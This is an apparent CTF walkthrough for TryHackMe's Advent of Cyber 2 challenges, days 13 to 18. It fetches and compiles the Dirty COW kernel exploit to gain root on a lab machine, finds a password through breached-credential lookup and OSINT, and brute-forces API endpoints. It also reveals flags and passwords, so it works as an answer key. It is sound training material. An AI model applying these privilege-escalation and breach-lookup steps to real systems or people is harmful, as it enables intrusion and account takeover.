# [Advent of Cyber 2 [2020]](https://tryhackme.com/room/adventofcyber2)

> Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas.

## Day 13: Coal for Christmas

scan the target

```
nmap -sS -sV -T4 10.10.22.125
```

![image](https://user-images.githubusercontent.com/90561566/222445181-223f51f0-5577-4723-92ea-b5e2d54c69cd.png)

telnet into the server, it also gives us the password

![image](https://user-images.githubusercontent.com/90561566/222445565-399e1120-7579-4ab7-9403-b902ba5b5020.png)

we have some infor here

![image](https://user-images.githubusercontent.com/90561566/222446673-60a84c7b-91cf-4c8a-92e7-268576e4c0e3.png)

quick research the file, you will found a version here

```
wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
```

transfer the file

![image](https://user-images.githubusercontent.com/90561566/222449024-13b9372a-8cf0-43ee-ab33-446d396b19b3.png)

run the file

```
gcc -pthread dirty.c -o dirty -lcrypt
```

![image](https://user-images.githubusercontent.com/90561566/222449198-2b06197c-57bc-414d-84c4-39635464a6d9.png)

we have changed password of an root's user

![image](https://user-images.githubusercontent.com/90561566/222449583-96b6909f-295c-476f-8713-df0c1376ac28.png)

there is an instruction for you

![image](https://user-images.githubusercontent.com/90561566/222449891-e6e847f8-077a-48de-83c5-d8e95690d12f.png)

```
touch coal
tree | md5sum
```

![image](https://user-images.githubusercontent.com/90561566/222450055-2de4cf16-d2d2-4c70-9e0b-937620be0c76.png)

Answer:

![image](https://user-images.githubusercontent.com/90561566/222459180-070864b2-ba15-4177-8bcc-c797b95871d4.png)

![image](https://user-images.githubusercontent.com/90561566/222459226-44c19abd-3fcd-4d45-94e4-02bc1033303e.png)

![image](https://user-images.githubusercontent.com/90561566/222459284-91e5153f-628b-4ef5-bd36-9f042d9bee2c.png)

![image](https://user-images.githubusercontent.com/90561566/222459539-0d9dbc52-dd86-436d-afef-0dc72c88031f.png)

## Day 14: Where's Rudolph?

search his username on google, i see 2 social accounts: twitter and reddit

![image](https://user-images.githubusercontent.com/90561566/222453488-5f7b6f64-18eb-47b5-a223-b9f2d2ce5ced.png)

in his reddit account, click tab comments

![image](https://user-images.githubusercontent.com/90561566/222452436-7b89398a-1d32-47ac-a0c2-dc0b8cf19b59.png)

search robert in google, you will found the next question

![image](https://user-images.githubusercontent.com/90561566/222453138-b534da7f-8391-4ac0-accd-25d4d11d89f4.png)

on his twitter, search for a tv show, it's bachelorette

![image](https://user-images.githubusercontent.com/90561566/222454717-afd87fea-fe18-4112-b34f-cc4f058b7769.png)

he has posted 2 images, on google image, you can find it's chicago

![image](https://user-images.githubusercontent.com/90561566/222455870-52d65996-9a0f-46ef-9d50-07af641e0867.png)

download the high resolution image and check for the exif infor

```
exiftool lights-festival-website.jpg
```

also in the exif data, they have a GPS Position and copyright infor contain our flag

search his email in scylla.sh, his password was reveal as spygame

Use the GPS Position we found earlier on openstreetmap, Look for the nearest Hotel: Chicago Marriott Downtown Magnificent Mile

![image](https://user-images.githubusercontent.com/90561566/222461664-bcd60506-be12-4de6-8a4d-8fbe93786ff4.png)

Answer:

![image](https://user-images.githubusercontent.com/90561566/222459653-6cea6b2b-e719-47b0-8522-d2079745acec.png)

![image](https://user-images.githubusercontent.com/90561566/222459699-ca29013c-cca1-4ed4-8f16-881c0f057d61.png)

## Day 15: There's a Python in my stocking!

Answer:

![image](https://user-images.githubusercontent.com/90561566/223003711-6e051157-8dfa-47dd-ab5a-a547fd42c981.png)

## Day 16: Help! Where is Santa?

scan the target

```
nmap -sS -sV -Pn -T4 10.10.167.235
```

![image](https://user-images.githubusercontent.com/90561566/223004718-fcee83a5-9a6d-424c-a998-9a8e7588b336.png)

view the webpage

![image](https://user-images.githubusercontent.com/90561566/223004863-4f0cc154-9714-444c-8906-a70ab04d1dfd.png)

just guessing, the api is in /api/

![image](https://user-images.githubusercontent.com/90561566/223005034-3bd10fd8-8ce4-4053-b861-45d56dee6061.png)

now, create a script python to solve the question

```
#! /usr/bin/env python
import requests
url = 'http://10.10.167.235/api/'

for i in range(1, 100, 2):
    r = requests.get(url + str(i))
    print(r.text)
```

![image](https://user-images.githubusercontent.com/90561566/223005618-965677ff-7860-46d0-827c-c3f6a0388116.png)

```
python3 script.py
```

![image](https://user-images.githubusercontent.com/90561566/223005728-f1f7cada-2165-4f1e-8e2e-4f1d0984547a.png)

Answer:

![image](https://user-images.githubusercontent.com/90561566/223005807-ae7a22f6-cba8-49f6-9564-795658b9f01f.png)

## Day 17: ReverseELFneering

ssh to the machine with given credentials

![image](https://user-images.githubusercontent.com/90561566/223635537-33646fca-8c03-416b-a3fe-5827da75ca26.png)

+ `db`: set a breakpoint
+ `dc`: move to next breakpoint
+ `ds`: move 1 line
+ `pdf @main`: again to see current point

analyst the program

```
r2 -d ./file1
aa
afl | grep main
```

![image](https://user-images.githubusercontent.com/90561566/223636831-f88f0eeb-68e5-4693-9431-bfeaf1de2614.png)

print the main function

```
pdf @main
```

![image](https://user-images.githubusercontent.com/90561566/223636991-87add459-e698-4f73-8e3c-a9fe3f583dac.png)

set a breakpoint and debug

```
db 0x00400b55
dc
px @rbp-0xc
```

![image](https://user-images.githubusercontent.com/90561566/223638692-7b0d1605-fb33-40d9-a139-982c14a90c51.png)

next and view again

```
ds
px @rbp-0xc
```

![image](https://user-images.githubusercontent.com/90561566/223638899-7516b65d-a0d2-453c-8cf2-86df538345e3.png)

next 4 lines and view other variable

```
ds
ds
ds
ds
px @rbp-0xb
```

back to our challenge

![image](https://user-images.githubusercontent.com/90561566/223647767-4791f146-2444-4bf4-8da8-490d1eb51aa2.png)

quick view, i can know that

+ `mov dword [local_ch], 1`: move local_ch to 1 (local_ch=1)
+ `mov dword [local_8h], 6`: move local_8h to 6 (local_8h=1)
+ `mov eax, dword [local_ch]`: move eax to local_ch (eax=1)
+ `imul eax, dword [local_8h]`: multiple eax with local_8h (eax=6)
+ `mov dword [local_4h], eax`: move local_4h to eax (local_4h=6)

To do that, you can read the instruction

```
leaq source, destination: this instruction sets destination to the address denoted by the expression in source
addq source, destination: destination = destination + source
subq source, destination: destination = destination - source
imulq source, destination: destination = destination * source
salq source, destination: destination = destination << source where << is the left bit shifting operator
sarq source, destination: destination = destination >> source where >> is the right bit shifting operator
xorq source, destination: destination = destination XOR source
andq source, destination: destination = destination & source
orq source, destination: destination = destination | source
```

Answer:

![image](https://user-images.githubusercontent.com/90561566/223648903-72a5d26d-2509-466f-a6f6-5535c967b3ed.png)

## Day 18: The Bits of Christmas

login to machine using provided credentials

![image](https://user-images.githubusercontent.com/90561566/224522683-8f6d933d-3b60-4434-ad4d-46738457e956.png)

![image](https://user-images.githubusercontent.com/90561566/224522801-9ba685d0-83fb-4d9d-8bb3-905c94b15ceb.png)

run ILSpy and open TBFC_APP.exe

![image](https://user-images.githubusercontent.com/90561566/224522879-265c1cc5-1371-4d28-af84-bda60cb011cf.png)

i found a strange component "Crackme"

![image](https://user-images.githubusercontent.com/90561566/224522927-185d6902-475a-4f47-b42f-099e722a6e8b.png)

see in the MainForm, maybe it's our panel

![image](https://user-images.githubusercontent.com/90561566/224522951-37e10504-4518-4cf2-abd9-5d3c72233833.png)

on buttonActivate_Click(), you will found santa's password and flag here

![image](https://user-images.githubusercontent.com/90561566/224522997-4a4de20f-4083-4644-8c52-72d89eaf5ab8.png)

```
// CrackMe.MainForm
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

private unsafe void buttonActivate_Click(object sender, EventArgs e)
{
  IntPtr value = Marshal.StringToHGlobalAnsi(textBoxKey.Text);
  sbyte* ptr = (sbyte*)System.Runtime.CompilerServices.Unsafe.AsPointer(ref <Module>.??_C@_0BB@IKKDFEPG@santapassword321@);
  void* ptr2 = (void*)value;
  byte b = *(byte*)ptr2;
  byte b2 = 115;
  if ((uint)b >= 115u)
  {
    while ((uint)b <= (uint)b2)
    {
      if (b != 0)
      {
        ptr2 = (byte*)ptr2 + 1;
        ptr++;
        b = *(byte*)ptr2;
        b2 = (byte)(*ptr);
        if ((uint)b < (uint)b2)
        {
          break;
        }
        continue;
      }
      MessageBox.Show("Welcome, Santa, here's your flag thm{046af}", "That's the right key!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      return;
    }
  }
  MessageBox.Show("Uh Oh! That's the wrong key", "You're not Santa!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
}
```

line 10 is santa's password and line 30 is our flag

![image](https://user-images.githubusercontent.com/90561566/224523110-21f289d5-9a71-48a3-b73a-2bbc7ef0b9a2.png)

Answer:

![image](https://user-images.githubusercontent.com/90561566/224523119-e920e611-7783-4753-bac7-fe3a6163f380.png)
